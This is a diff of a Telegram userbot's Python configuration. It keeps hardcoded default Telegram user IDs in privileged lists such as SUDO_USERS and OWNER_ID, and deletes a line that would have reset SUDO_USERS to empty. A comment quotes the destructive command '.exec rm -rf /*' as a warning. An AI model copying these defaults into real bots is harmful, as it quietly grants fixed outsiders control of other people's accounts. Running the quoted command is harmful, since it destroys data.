@@ -1,3 +1,4 @@
+ 
 import os
 from telethon.tl.types import ChatBannedRights
 ENV = bool(os.environ.get("ENV", False))
@@ -78,14 +79,13 @@ if ENV:
         # specify list of users allowed to use bot
         # WARNING: be careful who you grant access to your bot.
         # malicious users could do ".exec rm -rf /*"
-SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "1097131648").split())
+        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "1097131648").split())
         WHITELIST_USERS = set(int(x) for x in os.environ.get("WHITELIST_USERS", "832241419").split())
         BLACKLIST_USERS = set(int(x) for x in os.environ.get("BLACKLIST_USERS", "").split())
         DEVLOPERS = set(int(x) for x in os.environ.get("DEVLOPERS", "813878981").split())
         OWNER_ID = set(int(x) for x in os.environ.get("OWNER_ID", "953414679").split())
         SUPPORT_USERS = set(int(x) for x in os.environ.get("SUPPORT_USERS", "719195224").split())
         # VeryStream only supports video formats
-        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
         VERY_STREAM_LOGIN = os.environ.get("VERY_STREAM_LOGIN", None)
         VERY_STREAM_KEY = os.environ.get("VERY_STREAM_KEY", None)
         GROUP_REG_SED_EX_BOT_S = os.environ.get("GROUP_REG_SED_EX_BOT_S", r"(regex|moku|BananaButler_|rgx|l4mR)bot")
@@ -110,8 +110,8 @@ SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "1097131648").spli
         MONGO_URI = os.environ.get("MONGO_URI", None)
         #Lydia API
         LYDIA_API = os.environ.get("LYDIA_API",None)
-        PLUGIN_CHANNEL = int(os.environ.get("PLUGIN_CHANNEL", None))
+        PLUGIN_CHANNEL = int(os.environ.get("PLUGIN_CHANNEL", False))
 else:
     class Config(object):
         DB_URI = None
-      
+        # Add your UniBorg Vars Here
